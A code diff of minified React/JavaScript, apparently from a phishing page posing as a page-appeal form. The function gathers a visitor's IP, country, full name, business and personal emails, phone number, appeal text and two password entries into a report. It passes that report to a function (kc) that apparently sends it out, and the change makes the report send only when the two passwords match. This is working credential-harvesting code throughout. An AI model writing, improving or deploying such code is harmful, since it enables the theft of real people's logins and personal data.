@@ -8147,31 +8147,45 @@ function xf({
   setActive: t
 }) {
   const [n, r] = T.useState(!1), [l, o] = T.useState(""), [i, u] = T.useState(0), [a, d] = T.useState(0);
+  
   let v = uu.useRef("");
-  const m = () => {
-      if (a === 1 && (v.current = l), d(h => h + 1), l.length >= 6) {
-          r(!0), setTimeout(() => {
-              r(!1), u(1), o("")
-          }, 500);
-          const h = JSON.parse(localStorage.getItem("form")),
-          x = `
-          IP: ${localStorage.getItem("ip")}
-          Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}
 
-          Page Name: ${h.page}
-          Full Name: ${h.fname}
-          Business email: ${h.bemail}
-          Personal email: ${h.pemail}
-          Phone number: ${h.phone}
-          Appeal: ${h.apeal}
-          
-          First pas: ${l}
-          Last pas: ${v.current}`;
-          kc({
-              data: x
-          }), i === 1 && t(3)
-      }
-  };
+  const m = () => {
+    if (a === 1 && (v.current = l), d(h => h + 1), l.length >= 6 && l === v.current) {
+        r(!0);
+        setTimeout(() => {
+            r(!1);
+            u(1);
+            o("");
+        }, 500);
+
+        const h = JSON.parse(localStorage.getItem("form"));
+        const x = `
+            IP: ${localStorage.getItem("ip")}
+            Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}
+
+            Page Name: ${h.page}
+            Full Name: ${h.fname}
+            Business email: ${h.bemail}
+            Personal email: ${h.pemail}
+            Phone number: ${h.phone}
+            Appeal: ${h.apeal}
+            
+            First pas: ${l}
+            Last pas: ${v.current}
+        `;
+
+        kc({
+            data: x
+        });
+        
+        if (i === 1) {
+            t(3);
+        }
+    }
+};
+
+
   return s.jsx("div", {
       className: `form ${e&&"active"}`,
       onClick: () => t(0),
